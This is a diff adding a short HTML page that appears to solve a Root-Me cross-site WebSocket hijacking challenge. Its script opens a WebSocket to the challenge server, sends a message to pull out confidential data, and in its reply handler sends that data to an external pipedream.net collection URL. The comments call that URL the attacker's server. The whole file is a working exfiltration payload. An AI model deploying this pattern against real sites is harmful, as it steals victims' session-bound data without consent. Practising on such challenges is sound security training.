@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <body>
+        <script>
+            websocket = new WebSocket('ws://challenge01.root-me.org:58036')
+            websocket.onopen = start
+            websocket.onmessage = handleReply
+            function start(event) {
+              websocket.send("Hello"); //Send the message to retreive confidential information
+            }
+            function handleReply(event) {
+              //Exfiltrate the confidential information to attackers server
+              fetch('https://enxzn372sbyrlxi.m.pipedream.net?'+event.data, {mode: 'no-cors'})
+            }
+            </script>
+    </body>
+</head>
+</html>
